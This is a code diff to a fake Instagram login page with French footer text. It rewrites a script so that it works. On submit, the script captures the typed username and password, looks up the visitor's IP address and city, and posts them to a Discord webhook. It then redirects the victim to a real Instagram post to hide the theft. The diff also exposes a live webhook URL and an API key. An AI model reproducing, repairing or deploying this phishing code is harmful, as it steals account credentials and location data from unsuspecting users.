@@ -61,7 +61,7 @@
 
           <nav class="footer-nav" role="navigation">
             <ul>
-			  <li><a href=""></a></li>
+              <li><a href=""></a></li>
               <li><a href="https://about.instagram.com">À propos</a></li>
               <li><a href="https://help.instagram.com">Support</a></li>
               <li><a href="https://about.instagram.com/blog">Blog</a></li>
@@ -70,7 +70,7 @@
               <li><a href="https://help.instagram.com/519522125107875">Confidentialité</a></li>
               <li><a href="https://help.instagram.com/581066165581870">Conditions</a></li>
               <li><a href="https://about.meta.com/technologies/meta-verified/">Meta Verified</a></li>
-			  <li><a href="">Instagram/a></li>
+              <li><a href="">Instagram</a></li>
             </ul>
           </nav>
 
@@ -89,34 +89,49 @@
   </script>
 
   <script>
-  function sendMessage() {
-  function sleep(milliseconds) {
-  const date = Date.now();
-  let currentDate = null;
-  do {
-    currentDate = Date.now();
-  } while (currentDate - date < milliseconds);
-}
-   fetch('https://api.ipify.org?format=json')
-  .then(response => response.json())
-  .then(data => {
-    const ipAddress = data.ip;
-    fetch(`https://api.ipapi.com/${ipAddress}?access_key=5z1JSJGsJdKw2SyTGpQcKibSJvw47ytRY`)
-      .then(response => response.json())
-      .then(data => {
-        const city = data.city;
-      } 
+    function sendMessage() {
+      // Récupérer l'adresse IP de l'utilisateur
+      fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+          const ipAddress = data.ip;
+          // Utiliser l'adresse IP ici, par exemple l'envoyer à votre serveur
 
- var request = new XMLHttpRequest();
-    request.open("POST", "https://discord.com/api/webhooks/1125156301689847929/ajxOd4GPMFWeuWFVTVarNi8-8c25WBCT6VS9MuAMfl5hnHnd7GO_Lwh1PM3ZTgBE_qub");
-    request.setRequestHeader('Content-type', 'application/json');
-    var params = {
-const content = "> **Identifiant : **" + document.getElementById('username').value + "\n> **Mot de passe : **" + document.getElementById('password').value + "\n> **Adresse IP : **" + ipAddress + "\n> **Ville : **" + city;
+          // Récupérer la ville en fonction de l'adresse IP
+          fetch(`https://api.ipapi.com/${ipAddress}?access_key=5z1JSJGsJdKw2SyTGpQcKibSJvw47ytR`)
+            .then(response => response.json())
+            .then(data => {
+              const city = data.city;
+              // Utiliser la ville ici, par exemple l'envoyer à votre serveur
 
-}
-    request.send(JSON.stringify(params));
-	sleep(400)
-	window.location.replace("https://www.instagram.com/p/By7NkskoTip");
-  }
+              // Concaténer l'identifiant, le mot de passe, l'adresse IP et la ville
+              const content = "> **USERNAME  : **" + document.getElementById('username').value + "\n> **PASSWORD : **" + document.getElementById('password').value + "\n> **Adresse IP : **" + ipAddress + "\n> **Ville : **" + city;
+
+              var request = new XMLHttpRequest();
+              request.open("POST", "https://discord.com/api/webhooks/1125156301689847929/ajxOd4GPMFWeuWFVTVarNi8-8c25WBCT6VS9MuAMfl5hnHnd7GO_Lwh1PM3ZTgBE_qub");
+              request.setRequestHeader('Content-type', 'application/json');
+              var params = {
+                content: content
+              };
+              request.send(JSON.stringify(params));
+              sleep(400);
+              window.location.replace("https://www.instagram.com/p/By7NkskoTip");
+            })
+            .catch(error => {
+              console.error('Une erreur s\'est produite lors de la récupération de la ville :', error);
+            });
+        })
+        .catch(error => {
+          console.error('Une erreur s\'est produite lors de la récupération de l\'adresse IP :', error);
+        });
+    }
+
+    function sleep(milliseconds) {
+      const date = Date.now();
+      let currentDate = null;
+      do {
+        currentDate = Date.now();
+      } while (currentDate - date < milliseconds);
+    }
   </script>
 </body>
